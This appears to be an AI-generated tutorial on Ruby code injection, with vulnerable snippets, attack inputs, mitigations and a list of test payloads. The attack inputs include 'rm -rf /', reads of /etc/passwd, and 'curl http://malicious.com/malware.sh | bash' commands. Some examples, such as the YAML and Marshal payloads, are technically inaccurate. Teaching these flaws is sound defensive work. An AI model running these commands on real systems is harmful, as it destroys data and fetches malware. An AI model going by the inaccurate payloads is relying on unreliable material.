# Ruby-injection
### **What is Ruby Injection?**

**Ruby injection** is a type of security vulnerability where an attacker injects malicious Ruby code into an application. This occurs when user input is improperly handled and evaluated as Ruby code at runtime, allowing the attacker to execute arbitrary commands, access sensitive data, or manipulate the application’s behavior.

Ruby injection is a subset of **code injection** vulnerabilities and is especially dangerous in applications that use methods like `eval`, `instance_eval`, `class_eval`, or `send` to dynamically interpret or execute user input.

---

### **How Ruby Injection Happens**

Ruby injection typically occurs in scenarios where:

1. User input is concatenated or directly passed to a Ruby interpreter.
2. Unsafe methods (`eval`, `instance_eval`, etc.) are used without proper sanitization or validation.
3. User-controlled input is treated as executable code.

---

### **Examples of Ruby Injection**

#### **Example 1: Using `eval` with User Input**

**Vulnerable Code**:

```ruby
def calculate(expression)
  eval(expression)  # Executes the user-provided string as Ruby code
end

# Example Input:
calculate("1 + 1")  # Expected output: 2
```

#### **Attack**:

Input: `system('ls')`
The `eval` method executes this malicious command, listing files in the server directory.

---

#### **Example 2: Dynamic Attribute Access with `send`**

**Vulnerable Code**:

```ruby
class User
  attr_accessor :name, :email
end

def set_attribute(user, attr_name, value)
  user.send("#{attr_name}=", value)
end
```

#### **Attack**:

Input:

* `attr_name: delete`
* `value: nil`

The attacker manipulates the input to invoke unintended methods like `user.delete`, which could delete the user object.

---

#### **Example 3: Template Rendering with Unsafe Input**

**Vulnerable Code**:

```ruby
template = params[:template]  # User-controlled input
content = ERB.new(template).result(binding)
```

#### **Attack**:

Input: `<%= system('rm -rf /') %>`
This input deletes all files on the server when rendered.

---

### **Real-World Consequences**

1. **Arbitrary Code Execution**: Attackers can execute commands or scripts on the server.
2. **Data Breaches**: Sensitive data can be accessed or leaked.
3. **Privilege Escalation**: Attackers can gain unauthorized control over the application.
4. **Service Disruption**: Malicious commands can crash or disable the application.

---

### **Methods Prone to Ruby Injection**

#### **1. `eval`**

Executes a string as Ruby code. Highly dangerous if the string is user-controlled.

```ruby
eval("2 + 2")  # Safe
eval(user_input)  # Vulnerable
```

#### **2. `instance_eval` and `class_eval`**

Executes a string in the context of an object or class.

```ruby
object.instance_eval("self.name = 'hacked'")
```

#### **3. `send`**

Invokes methods dynamically, including private ones.

```ruby
user.send(:delete_account)
```

#### **4. `Kernel#system`, `Kernel#exec`, and Backticks (` `` `)**

Executes shell commands directly.

```ruby
system("rm -rf /")  # Dangerous if user-controlled
```

#### **5. Deserialization**

Deserializing untrusted input can lead to code injection.

```ruby
data = Marshal.load(user_input)  # Vulnerable
```

---

### **Mitigation Strategies**

1. **Avoid Dangerous Methods**:

   * Avoid using `eval`, `instance_eval`, `class_eval`, or similar methods with user input.
   * Example:

     ```ruby
     # Instead of eval:
     eval("1 + 1")  # Dangerous
     result = 1 + 1  # Safe
     ```

2. **Validate and Sanitize Input**:

   * Ensure inputs conform to expected formats using regular expressions or libraries.
   * Example:

     ```ruby
     raise "Invalid input" unless user_input.match?(/^\d+$/)
     ```

3. **Use Secure Alternatives**:

   * Use APIs or libraries instead of dynamically executing code.
   * Example:

     ```ruby
     eval("2 + 2")  # Dangerous
     2 + 2          # Safe
     ```

4. **Restrict `send` Usage**:

   * Use it only for known, safe method calls.
   * Example:

     ```ruby
     if ["name", "email"].include?(attr_name)
       user.send("#{attr_name}=", value)
     else
       raise "Invalid attribute"
     end
     ```

5. **Escape Inputs in Templates**:

   * Ensure all user input in templates is escaped to prevent malicious code execution.
   * Example (ERB):

     ```ruby
     <%= h user_input %>
     ```

6. **Use Sandboxing**:

   * Run risky code in isolated environments (e.g., containers or `Safe` gems).

7. **Update Dependencies**:

   * Ensure Ruby and gem dependencies are up-to-date to mitigate known vulnerabilities.

---

### **Secure Example**

Here’s how to securely handle dynamic user input:

**Unsafe Code**:

```ruby
def run_command(command)
  system(command)  # Vulnerable
end
```

**Secure Code**:

```ruby
def run_command(command)
  allowed_commands = ["ls", "pwd"]
  if allowed_commands.include?(command)
    system(command)
  else
    puts "Invalid command"
  end
end
```

---

### **Testing for Ruby Injection**

1. **Payloads to Test**:

   * `system('ls')`
   * `; rm -rf /`
   * `<%= File.read('/etc/passwd') %>`
   * `#{`whoami`}`

2. **Tools**:

   * **Burp Suite**: Intercept and modify requests to test input fields.
   * **OWASP ZAP**: Automated vulnerability scanning.
   * **Custom Scripts**: Create test scripts to inject malicious payloads systematically.

---

Here are additional examples of **Ruby Injection vulnerabilities** to further clarify how they can manifest in different scenarios and applications:

---

### **Example 4: Vulnerable Controller Action in Rails**

#### Scenario:

A Ruby on Rails controller dynamically calls a method based on user input.

**Vulnerable Code**:

```ruby
class UsersController < ApplicationController
  def call_method
    method_name = params[:method]
    User.send(method_name)
  end
end
```

#### Attack:

URL: `/users/call_method?method=delete_all`
This allows the attacker to invoke the `User.delete_all` method, deleting all user records.

---

### **Example 5: Dynamic Method Invocation via `define_method`**

#### Scenario:

A developer creates dynamic methods using `define_method` without validating input.

**Vulnerable Code**:

```ruby
class User
  def self.create_method(name)
    define_method(name) do |*args|
      eval(args.join(' '))  # Dangerous: Executes input as Ruby code
    end
  end
end
```

#### Attack:

Input: `User.create_method(:hack)` followed by `user.hack("system('ls')")`
This runs `ls` and lists all files in the server directory.

---

### **Example 6: Unsafe String Interpolation**

#### Scenario:

An application constructs and executes commands dynamically using string interpolation.

**Vulnerable Code**:

```ruby
def execute_command(command)
  system("echo #{command}")
end
```

#### Attack:

Input: `$(rm -rf /)`
The system call becomes:

```bash
echo $(rm -rf /)
```

This deletes all files on the server.

---

### **Example 7: Unsafe Use of `Kernel#exec`**

#### Scenario:

An application uses `Kernel#exec` to allow users to execute system commands.

**Vulnerable Code**:

```ruby
def run_command(command)
  exec(command)  # Directly executes user-provided command
end
```

#### Attack:

Input: `ls; curl http://malicious.com/malware.sh | bash`
This executes the `ls` command and downloads/executes a malicious script.

---

### **Example 8: Command Execution in Template Rendering**

#### Scenario:

An application uses ERB to render templates based on user input.

**Vulnerable Code**:

```ruby
def render_template(template)
  ERB.new(template).result(binding)
end
```

#### Attack:

Input: `<%= `ls` %>`
This renders the output of the `ls` command in the template.

---

### **Example 9: Malicious Code in Serialized Data**

#### Scenario:

A Ruby application deserializes user-supplied data.

**Vulnerable Code**:

```ruby
data = params[:data]
object = Marshal.load(data)  # Directly deserializes user input
```

#### Attack:

An attacker crafts a malicious serialized object that runs arbitrary code when deserialized:

```ruby
class Exploit
  def self._load(str)
    system('ls')
  end
end
```

Serialized payload:

```ruby
Marshal.dump(Exploit)
```

When deserialized, the payload executes `ls` or any other command.

---

### **Example 10: Insecure YAML Parsing**

#### Scenario:

An application parses YAML data provided by the user.

**Vulnerable Code**:

```ruby
require 'yaml'

data = params[:yaml_data]
YAML.load(data)  # Insecure: Can execute arbitrary Ruby objects
```

#### Attack:

Payload:

```yaml
--- !ruby/object:Kernel
exec: 'ls'
```

When parsed, this executes the `ls` command.

---

### **Example 11: Unsafe Use of `send` with ActiveRecord**

#### Scenario:

A Rails application dynamically calls ActiveRecord methods.

**Vulnerable Code**:

```ruby
def update_attribute(user_id, attr, value)
  user = User.find(user_id)
  user.send("#{attr}=", value)
  user.save
end
```

#### Attack:

Input:

* `attr: destroy`
* `value: nil`

The attacker effectively invokes `user.destroy`, deleting the user record.

---

### **Example 12: Using `instance_eval` for Configuration**

#### Scenario:

A developer uses `instance_eval` to load user-supplied configuration files.

**Vulnerable Code**:

```ruby
class Config
  def load(file)
    instance_eval(File.read(file))
  end
end
```

#### Attack:

If an attacker uploads a configuration file containing:

```ruby
system('rm -rf /')
```

This command is executed when the file is loaded.

---

### **Example 13: Executing Commands via HTTP Parameters**

#### Scenario:

A web service accepts a query parameter and uses it in a system call.

**Vulnerable Code**:

```ruby
require 'sinatra'

get '/run' do
  command = params[:command]
  `#{command}`  # Directly executes the command
end
```

#### Attack:

Request: `/run?command=ls;rm -rf /`
This executes both `ls` and `rm -rf /`, potentially destroying the server.

---

### **Example 14: Exploiting Rails `to_query`**

#### Scenario:

Rails generates query strings based on user input.

**Vulnerable Code**:

```ruby
params[:user_input].to_query
```

#### Attack:

Input: `{ some: "`; rm -rf /`" }`
When this is converted to a query string, it could lead to injection vulnerabilities if concatenated into a command.

---

### **Example 15: Environment Variable Manipulation**

#### Scenario:

An application uses environment variables dynamically set by user input.

**Vulnerable Code**:

```ruby
def run_with_env(command, env_var)
  ENV['CUSTOM_ENV'] = env_var
  system(command)
end
```

#### Attack:

Input for `env_var`: `; curl http://malicious.com/malware.sh | bash`
This injects a malicious environment variable and runs a harmful command.

---

### **Mitigation Strategies for Ruby Injection**

1. **Avoid Dangerous Methods**: Avoid `eval`, `exec`, `send`, and similar methods for user-supplied input.
2. **Escape Inputs**:

   * Use `Shellwords.escape` to sanitize shell commands.

     ```ruby
     require 'shellwords'
     command = "ls #{Shellwords.escape(user_input)}"
     ```
3. **Whitelist Valid Inputs**:

   * Explicitly define and enforce valid values for parameters.
4. **Restrict Deserialization**:

   * Use safe libraries like `JSON` instead of `Marshal` or `YAML`.
5. **Secure Templates**:

   * Always escape user input in templates with `ERB::Util.h`.
6. **Sandbox Execution**:

   * Run risky commands in isolated containers or environments.

---

These additional examples cover a broader range of vulnerabilities related to Ruby Injection, from unsafe deserialization to dangerous use of ActiveRecord methods. By understanding these scenarios, developers can proactively secure their Ruby applications. Let me know if you'd like even more examples or details!

